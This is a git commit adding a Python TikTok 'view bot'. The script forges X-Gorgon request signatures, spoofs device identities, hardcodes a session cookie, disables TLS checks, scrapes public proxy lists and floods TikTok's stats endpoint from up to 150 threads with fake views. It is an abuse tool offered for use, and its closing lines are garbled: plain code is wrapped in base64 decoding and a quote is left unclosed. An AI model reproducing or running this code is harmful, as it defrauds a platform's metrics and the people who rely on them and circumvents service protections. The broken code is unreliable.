809459af6b824bec5492e5cb76a83975b08c930d
Stinkypuppy <157723046+Stinkypuppy@users.noreply.github.com>
2024-04-24 08:46:47 -0700

    Create shepbot.py

---
+++ shepbot.py
@@ -0,0 +1,323 @@
+#-----[Library]-----#
+from urllib.parse import urlencode
+import base64
+from pystyle import *
+import os
+import sys
+import ssl
+import re
+import time
+import random
+import threading
+import requests
+import hashlib
+import json
+from urllib3.exceptions import InsecureRequestWarning
+from http import cookiejar
+#-----[Guinness Shepherd]-----#
+furry = "\033[1;37m"
+yiff = "\033[1;32m"
+huff = "\033[1;34m"
+e621 = "\033[1;31m"
+blfc = "\033[1;33m"
+murr = "\033[1;35m"
+dog = "\033[32;5;245m\033[1m\033[38;5;39m"
+shep = "</>"
+gay = 0
+#-----[Start]-----#
+banner = f"""
+                                         do.                                           
+                                        :NOX 
+                                       ,NOM@: 
+                                       :NNNN: 
+                                       :XXXON 
+                                       :XoXXX. 
+                                       MM;ONO: 
+  .oob..                              :MMO;MOM 
+ dXOXYYNNb.                          ,NNMX:MXN 
+ Mo"'  '':Nbb                        dNMMN MNN: 
+ Mo  'O;; ':Mb.                     ,MXMNM MNX: 
+ @O :;XXMN..'X@b.                  ,NXOMXM MNX: 
+ YX;;NMMMM@M;;OM@o.                dXOOMMN:MNX: 
+ 'MOONM@@@MMN:':NONb.            ,dXONM@@MbMXX: 
+  MOON@M@@MMMM;;:OOONb          ,MX'"':ONMMMMX: 
+  :NOOM@@MNNN@@X;""XNN@Mb     .dP"'   ,..OXM@N: 
+   MOON@@MMNXXMMO  :M@@M...@o.oN"0MQOOOXNNXXOo:
+   :NOX@@@MNXXXMNo :MMMM@K"`,:;NNM@@NXM@MNO;.'N. 
+    NO:X@@MNXXX@@O:'X@@@@MOOOXMM@M@NXXN@M@NOO ''b 
+    `MO.'NMNXXN@@N: 'XXM@NMMXXMM@M@XO"'"XM@X;.  :b 
+     YNO;'"NXXXX@M;;::"XMNN:""ON@@MO: ,;;.:Y@X: :OX. 
+      Y@Mb;;XNMM@@@NO: ':O: 'OXN@@MO" ONMMX:`XO; :X@. 
+      '@XMX':OX@@MN:    ;O;  :OX@MO" 'OMM@N; ':OO;N@N 
+       YN;":.:OXMX"': ,:NNO;';XMMX:  ,;@@MNN.'.:O;:@X: 
+       `@N;;XOOOXO;;:O;:@MOO;:O:"" ,oMP@@K"YM.;NMO;`NM 
+        `@@MN@MOX@@MNMN;@@MNXXOO: ,d@NbMMP'd@@OX@NO;.'bb. 
+       .odMX@@XOOM@M@@XO@MMMMMMNNbN"YNNNXoNMNMO"OXXNO.."";o. 
+     .ddMNOO@@XOOM@@XOONMMM@@MNXXMMo;."' .":OXO ':.'"'"'  '""o. 
+    'N@@X;,M@MXOOM@OOON@MM@MXOO:":ONMNXXOXX:OOO               ""ob. 
+   ')@MP"';@@XXOOMMOOM@MNNMOO""   '"OXM@MM: :OO.        :...';o;.;Xb. 
+  .@@MX" ;X@@XXOOM@OOXXOO:o:'      :OXMNO"' ;OOO;.:     ,OXMOOXXXOOXMb 
+ ,dMOo:  oO@@MNOON@N:::"      .    ,;O:."'  .dMXXO:    ,;OX@XO"":ON@M@ 
+:Y@MX:.  oO@M@NOXN@NO. ..: ,;;O;.       :.OX@@MOO;..   .OOMNMO.;XN@M@P 
+,MP"OO'  oO@M@O:ON@MO;;XO;:OXMNOO;.  ,.;.;OXXN@MNXO;.. oOX@NMMN@@@@@M: 
+`' "O:;;OON@@MN::XNMOOMXOOOM@@MMNXO:;XXNNMNXXXN@MNXOOOOOXNM@NM@@@M@MP 
+   :XN@MMM@M@M:  :'OON@@XXNM@M@MXOOdN@@@MM@@@@MMNNXOOOXXNNN@@M@MMMM" 
+   .oNM@MM@ONO'   :;ON@@MM@MMNNXXXM@@@@M@PY@@MMNNNNNNNNNNNM@M@M@@P' 
+  ;O:OXM@MNOOO.   'OXOONM@MNNMMXON@MM@@b. 'Y@@@@@@@@@@@@@M@@MP"' 
+ ;O':OOXNXOOXX:   :;NMO:":NMMMXOOX@MN@@@@b.:M@@@M@@@MMM@ 
+ :: ;"OOOOOO@N;:  'ON@MO.'":""OOOO@@NNMN@@@. Y@@@MMM@@@@b 
+ :;   ':O:oX@@O;;  ;O@@XO'   "oOOOOXMMNMNNN@MN""YMNMMM@@MMo. 
+ :N:.   ''oOM@NMo.::OX@NOOo.  ;OOOXXNNNMMMNXNM@bd@MNNMMM@MM@bb    @GUINNESSGSHEP 
+  @;O .  ,OOO@@@MX;;ON@NOOO.. ' ':OXN@NNN@@@@@M@@@@MNXNMM@MMM@, 
+  M@O;;  :O:OX@@M@NXXOM@NOO:;;:,;;ON@NNNMM'`"@@M@@@@@MXNMMMMM@N 
+  N@NOO;:oO;O:NMMM@M@OO@NOO;O;oOOXN@NNM@@'   `Y@NM@@@@MMNNMM@MM 
+  ::@MOO;oO:::OXNM@@MXOM@OOOOOOXNMMNNNMNP      ""MNNM@@@MMMM@MP 
+    @@@XOOO':::OOXXMNOO@@OOOOXNN@NNNNNNNN        '`YMM@@@MMM@P' 
+    MM@@M:'''' O:":ONOO@MNOOOOXM@NM@NNN@P            "`SHEP' 
+    ''MM@:     "' 'OOONMOYOOOOO@MM@MNNM" 
+      YM@'         :OOMN: :OOOO@MMNOXM'
+      `:P           :oP''  "'OOM@NXNM' 
+       `'                    GUINNESS' 
+                               '"'                                                         
+                                                                                 
+{furry}           </> CREATED BY :- 🔥 Guinness Shepherd  🔥 </>
+\033[1;37m─────────────────────────────────────────────────────────────────────────────
+{e621}[{furry}{shep}{e621}] \033[1;35mTikTok:\033[1;36m guinnessgshep
+{e621}[{furry}{shep}{e621}] {blfc}GUINNESS VIEW BOT V3
+\033[1;37m─────────────────────────────────────────────────────────────────────────────"""
+class BlockCookies(cookiejar.CookiePolicy):
+    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
+    netscape = True
+    rfc2965 = hide_cookie2 = False
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+ssl._create_default_https_context = ssl._create_unverified_context
+
+r = requests.Session()
+r.cookies.set_policy(BlockCookies())
+
+__domains = ["api22-core-c-useast1a.tiktokv.com", "api19-core-c-useast1a.tiktokv.com",
+                          "api16-core-c-useast1a.tiktokv.com", "api21-core-c-useast1a.tiktokv.com"]
+__devices = ["SM-G9900", "SM-A136U1", "SM-M225FV", "SM-E426B", "SM-M526BR", "SM-M326B", "SM-A528B",
+                          "SM-F711B", "SM-F926B", "SM-A037G", "SM-A225F", "SM-M325FV", "SM-A226B", "SM-M426B",
+                          "SM-A525F", "SM-N976N"]
+__versions = ["190303", "190205", "190204", "190103", "180904", "180804", "180803", "180802",  "270204"]
+class Gorgon:
+	def __init__(self,params:str,data:str,cookies:str,unix:int)->None:self.unix=unix;self.params=params;self.data=data;self.cookies=cookies
+	def hash(self,data:str)->str:
+		try:_hash=str(hashlib.md5(data.encode()).hexdigest())
+		except Exception:_hash=str(hashlib.md5(data).hexdigest())
+		return _hash
+	def get_base_string(self)->str:base_str=self.hash(self.params);base_str=base_str+self.hash(self.data)if self.data else base_str+str('0'*32);base_str=base_str+self.hash(self.cookies)if self.cookies else base_str+str('0'*32);return base_str
+	def get_value(self)->json:base_str=self.get_base_string();return self.encrypt(base_str)
+	def encrypt(self,data:str)->json:
+		unix=self.unix;len=20;key=[223,119,185,64,185,155,132,131,209,185,203,209,247,194,185,133,195,208,251,195];param_list=[]
+		for i in range(0,12,4):
+			temp=data[8*i:8*(i+1)]
+			for j in range(4):H=int(temp[j*2:(j+1)*2],16);param_list.append(H)
+		param_list.extend([0,6,11,28]);H=int(hex(unix),16);param_list.append((H&4278190080)>>24);param_list.append((H&16711680)>>16);param_list.append((H&65280)>>8);param_list.append((H&255)>>0);eor_result_list=[]
+		for (A,B) in zip(param_list,key):eor_result_list.append(A^B)
+		for i in range(len):C=self.reverse(eor_result_list[i]);D=eor_result_list[(i+1)%len];E=C^D;F=self.rbit_algorithm(E);H=(F^4294967295^len)&255;eor_result_list[i]=H
+		result=''
+		for param in eor_result_list:result+=self.hex_string(param)
+		return{'X-Gorgon':'0404b0d30000'+result,'X-Khronos':str(unix)}
+	def rbit_algorithm(self,num):
+		result='';tmp_string=bin(num)[2:]
+		while len(tmp_string)<8:tmp_string='0'+tmp_string
+		for i in range(0,8):result=result+tmp_string[7-i]
+		return int(result,2)
+	def hex_string(self,num):
+		tmp_string=hex(num)[2:]
+		if len(tmp_string)<2:tmp_string='0'+tmp_string
+		return tmp_string
+	def reverse(self,num):tmp_string=self.hex_string(num);return int(tmp_string[1:]+tmp_string[:1],16)
+
+def send(__device_id, __install_id, cdid, openudid):
+    global reqs, _lock, success, fails, rps, rpm
+    for x in range(10):
+        try:
+            version = random.choice(__versions)
+            params = urlencode(
+                                {
+                                    "os_api": "25",
+                                    "device_type": random.choice(__devices),
+                                    "ssmix": "a",
+                                    "manifest_version_code": version,
+                                    "dpi": "240",
+                                    "region": "VN",
+                                    "carrier_region": "VN",
+                                    "app_name": "musically_go",
+                                    "version_name": "27.2.4",
+                                    "timezone_offset": "-28800",
+                                    "ab_version": "27.2.4",
+                                    "ac2": "wifi",
+                                    "ac": "wifi",
+                                    "app_type": "normal",
+                                    "channel": "googleplay",
+                                    "update_version_code": version,
+                                    "device_platform": "android",
+                                    "iid": __install_id,
+                                    "build_number": "27.2.4",
+                                    "locale": "vi",
+                                    "op_region": "VN",
+                                    "version_code": version,
+                                    "timezone_name": "Asia/Ho_Chi_Minh",
+                                    "device_id": __device_id,
+                                    "sys_region": "VN",
+                                    "app_language": "vi",
+                                    "resolution": "720*1280",
+                                    "device_brand": "samsung",
+                                    "language": "vi",
+                                    "os_version": "7.1.2",
+                                    "aid": "1340"
+                                }
+        )
+            payload = f"item_id={__aweme_id}&play_delta=1"
+            sig     = Gorgon(params=params, cookies=None, data=None, unix=int(time.time())).get_value()
+
+            proxy = random.choice(proxies) if config['proxy']['use-proxy'] else ""
+
+            response = r.post(
+                url = (
+                    "https://"
+                    +  random.choice(__domains)  +
+                    "/aweme/v1/aweme/stats/?" + params
+                ),
+                data    = payload,
+                headers = {'cookie':'sessionid=90c38a59d8076ea0fbc01c8643efbe47','x-gorgon':sig['X-Gorgon'],'x-khronos':sig['X-Khronos'],'user-agent':'okhttp/3.10.0.1'},
+                verify  = False,
+                proxies = {"http": proxy_format+proxy, "https": proxy_format+proxy} if config['proxy']['use-proxy'] else {}
+            )
+            reqs += 1
+            try:
+                if response.json()['status_code'] == 0:
+                    _lock.acquire()
+                    print(f'{e621}[{blfc}🔥 Guinness Shepherd 🔥{e621}] {e621}[{yiff}BUFF VIEW SUCCESS{e621}] {e621}{huff}+: {furry}{success}{e621} View')
+                    success += 1
+                    _lock.release()
+            except:
+                if _lock.locked():_lock.release()
+                fails += 1
+                continue
+
+        except Exception as e:
+            pass
+
+def rpsm_loop():
+    global rps, rpm
+    while True:
+        initial = reqs
+        time.sleep(1.5)
+        rps = round((reqs - initial) / 1.5, 1)
+        rpm = round(rps * 60, 1)
+
+def fetch_proxies():
+    url_list = [
+        "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxy-list/data.txt",
+        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
+        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
+        "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
+        "https://proxyspace.pro/https.txt",
+        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
+        "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
+        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
+        "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+        "https://www.proxy-list.download/api/v1/get?type=http",
+        "https://www.proxyscan.io/download?type=http",
+        "http://spys.me/proxy.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+        "https://api.openproxylist.xyz/http.txt",
+        "https://www.my-proxy.com/free-proxy-list.html",
+        "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
+        "https://www.my-proxy.com/free-anonymous-proxy.html",
+        "https://www.my-proxy.com/free-transparent-proxy.html",
+        "https://www.my-proxy.com/free-proxy-list-2.html",
+        "https://www.my-proxy.com/free-proxy-list-3.html",
+        "https://www.my-proxy.com/free-proxy-list-4.html",
+        "https://proxy50-50.blogspot.com/",
+        "https://www.my-proxy.com/free-proxy-list-5.html",
+        "http://alexa.lr2b.com/proxylist.txt",
+        "http://rootjazz.com/proxies/proxies.txt",
+        "https://www.freeproxychecker.com/result/http_proxies.txt",
+        "https://www.my-proxy.com/free-socks-4-proxy.html",
+        "http://www.proxyserverlist24.top/feeds/posts/default",
+        "https://www.my-proxy.com/free-proxy-list-6.html",
+        "https://www.my-proxy.com/free-proxy-list-7.html",
+        "https://www.my-proxy.com/free-proxy-list-8.html",
+        "http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
+        "https://www.my-proxy.com/free-proxy-list-9.html",
+        "https://www.my-proxy.com/free-proxy-list-10.html",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
+        "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
+        "https://proxy-spider.com/api/proxies.example.txt",
+        "https://multiproxy.org/txt_all/proxy.txt",
+        "http://rootjazz.com/proxies/proxies.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy",
+        "http://k2ysarchive.xyz/proxy/http.txt",
+        "https://proxyspace.pro/http.txt",
+        "https://proxyspace.pro/https.txt"
+
+    ]
+    for url in url_list :
+        response = requests.get(
+            url=url
+        )
+        if response.ok:
+            with open("proxies.txt", "a+") as f:
+                f.write(response.text)
+                f.close()
+        else:
+            pass
+
+if __name__ == "__main__":
+    with open('devices.txt', 'r') as f:
+        devices = f.read().splitlines()
+    
+    with open('config.json', 'r') as f:
+        config = json.load(f)
+    if config["proxy"]['proxyscrape']:
+        fetch_proxies()
+    proxy_format = f'{config["proxy"]["proxy-type"].lower()}://{config["proxy"]["credential"]+"@" if config["proxy"]["auth"] else ""}' if config['proxy']['use-proxy'] else ''
+    if config['proxy']['use-proxy']:
+        with open('proxies.txt', 'r') as f:
+            proxies = f.read().splitlines()
+    os.system("cls" if os.name == "nt" else "clear")
+    print(banner)
+    try:
+        link = input(f'{e621}[{furry}{shep}{e621}] {yiff}ENTER A TIKTOK VIDEO URL HERE: {furry}')
+        print(f'{furry}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
+        __aweme_id = str(
+            re.findall(r"(\d{18,19})", link)[0]
+            if len(re.findall(r"(\d{18,19})", link)) == 1
+            else re.findall(
+                r"(\d{18,19})",
+                requests.head(link, allow_redirects=True, timeout=5).url
+            )[0]
+        )
+    except:
+        exit(f"{e621}[{furry}{shep}{e621}] {e621}INVALID LINK")
+    
+    _lock = threading.Lock()
+    reqs = 0
+    success = 0
+    fails = 0
+    rpm = 0
+    rps = 0
+    
+    threading.Thread(target=rpsm_loop).start()
+    
+    while True:
+        device = random.choice(devices)
+
+        if eval(base64.b64decode("threading.active_count() <= 150
+            did, iid, cdid, openudid = device.split(':')
+            eval(base64.b64decode('threading.Thread(target=send,args=[did,iid,cdid,openid]).start()'))
